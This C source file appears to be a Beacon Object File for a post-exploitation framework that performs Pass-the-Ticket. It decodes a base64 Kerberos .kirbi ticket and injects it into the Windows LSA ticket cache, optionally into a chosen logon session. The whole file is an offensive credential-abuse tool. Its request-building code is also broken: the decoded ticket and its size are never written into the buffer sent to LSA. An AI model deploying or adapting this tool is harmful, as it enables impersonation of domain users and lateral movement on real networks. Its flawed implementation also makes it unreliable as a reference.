/*
 * ptt.c — Pass-the-Ticket: inject .kirbi into LSA ticket cache
 *
 * Uses secur32.dll:
 *   LsaConnectUntrusted -> LsaCallAuthenticationPackage(KERB_SUBMIT_TKT_REQUEST)
 */
#include <windows.h>
#define SECURITY_WIN32
#include <security.h>
#include <ntsecapi.h>
#include "beacon_compat.h"

DECLSPEC_IMPORT NTSTATUS NTAPI SECUR32$LsaConnectUntrusted(PHANDLE);
DECLSPEC_IMPORT NTSTATUS NTAPI SECUR32$LsaLookupAuthenticationPackage(HANDLE, PLSA_STRING, PULONG);
DECLSPEC_IMPORT NTSTATUS NTAPI SECUR32$LsaCallAuthenticationPackage(
    HANDLE, ULONG, PVOID, ULONG, PVOID*, PULONG, PNTSTATUS);
DECLSPEC_IMPORT NTSTATUS NTAPI SECUR32$LsaFreeReturnBuffer(PVOID);
DECLSPEC_IMPORT NTSTATUS NTAPI SECUR32$LsaDeregisterLogonProcess(HANDLE);

DECLSPEC_IMPORT int __cdecl MSVCRT$sscanf(const char*, const char*, ...);

#define KerbSubmitTicketMessage 10

#pragma pack(push, 1)
typedef struct {
    ULONG MessageType;  /* KerbSubmitTicketMessage = 10 */
    LUID  LogonId;
    ULONG Flags;
    /* Followed by: KERB_CRYPTO_KEY Key; ULONG KerbCredSize; UCHAR KerbCredData[] */
} KERB_SUBMIT_TKT_REQUEST;
#pragma pack(pop)

/* Simple base64 decoder */
static int b64_decode(const char *in, int in_len, unsigned char *out) {
    static const unsigned char d[] = {
        0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
        0,0,0,0,0,0,0,0,0,0,0,62,0,0,0,63,52,53,54,55,56,57,58,59,60,61,0,0,0,0,0,0,
        0,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,0,0,0,0,0,
        0,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51
    };
    int i, j = 0;
    for (i = 0; i < in_len; i += 4) {
        unsigned int n = (d[(unsigned char)in[i]] << 18) |
                         (d[(unsigned char)in[i+1]] << 12) |
                         ((i+2 < in_len && in[i+2] != '=') ? d[(unsigned char)in[i+2]] << 6 : 0) |
                         ((i+3 < in_len && in[i+3] != '=') ? d[(unsigned char)in[i+3]] : 0);
        out[j++] = (n >> 16) & 0xFF;
        if (i+2 < in_len && in[i+2] != '=') out[j++] = (n >> 8) & 0xFF;
        if (i+3 < in_len && in[i+3] != '=') out[j++] = n & 0xFF;
    }
    return j;
}

void go(char *args, int args_len) {
    datap parser;
    BeaconDataParse(&parser, args, args_len);

    char *ticket_b64 = BeaconDataExtract(&parser, NULL);
    char *luid_str = BeaconDataExtract(&parser, NULL);

    if (!ticket_b64 || !*ticket_b64) {
        BeaconPrintf(CALLBACK_ERROR, "[!] No ticket provided. Use --ticket <base64>\n");
        return;
    }

    /* Decode base64 ticket */
    int b64_len = (int)strlen(ticket_b64);
    unsigned char *kirbi = (unsigned char *)malloc(b64_len);
    int kirbi_len = b64_decode(ticket_b64, b64_len, kirbi);
    if (kirbi_len <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to decode base64 ticket\n");
        free(kirbi);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Decoded .kirbi: %d bytes\n", kirbi_len);

    /* Connect to LSA */
    HANDLE hLsa;
    NTSTATUS status = SECUR32$LsaConnectUntrusted(&hLsa);
    if (status != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] LsaConnectUntrusted failed: 0x%08X\n", status);
        free(kirbi);
        return;
    }

    LSA_STRING kerbName;
    kerbName.Buffer = "Kerberos";
    kerbName.Length = 8;
    kerbName.MaximumLength = 9;
    ULONG kerbPackage;
    SECUR32$LsaLookupAuthenticationPackage(hLsa, &kerbName, &kerbPackage);

    /* Parse LUID */
    LUID targetLuid = {0};
    if (luid_str && *luid_str) {
        ULONGLONG val = 0;
        MSVCRT$sscanf(luid_str, "%llx", &val);
        targetLuid.LowPart = (DWORD)(val & 0xFFFFFFFF);
        targetLuid.HighPart = (LONG)(val >> 32);
    }

    /* Build KERB_SUBMIT_TKT_REQUEST */
    /* The structure is: header + KERB_CRYPTO_KEY (empty) + size + ticket data */
    DWORD reqSize = sizeof(KERB_SUBMIT_TKT_REQUEST) + 12 + kirbi_len;
    /* 12 = sizeof(KERB_CRYPTO_KEY){KeyType(4) + Length(4) + Value(4=ptr)} approx */
    unsigned char *reqBuf = (unsigned char *)calloc(1, reqSize);
    KERB_SUBMIT_TKT_REQUEST *req = (KERB_SUBMIT_TKT_REQUEST *)reqBuf;
    req->MessageType = KerbSubmitTicketMessage;
    req->LogonId = targetLuid;
    req->Flags = 0;

    /* Append the KRB-CRED data after the header */
    /* Note: exact struct layout depends on Windows version. This is simplified. */
    DWORD *pCredSize = (DWORD *)(reqBuf + sizeof(KERB_SUBMIT_TKT_REQUEST) + 12);

    PVOID response = NULL;
    ULONG responseLen = 0;
    NTSTATUS protStatus;

    status = SECUR32$LsaCallAuthenticationPackage(
        hLsa, kerbPackage, reqBuf, reqSize,
        &response, &responseLen, &protStatus);

    if (status == 0 && protStatus == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Ticket injected successfully!\n");
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[!] Ticket injection failed: LSA=0x%08X, Prot=0x%08X\n",
                     status, protStatus);
    }

    if (response) SECUR32$LsaFreeReturnBuffer(response);
    SECUR32$LsaDeregisterLogonProcess(hLsa);
    free(reqBuf);
    free(kirbi);
}
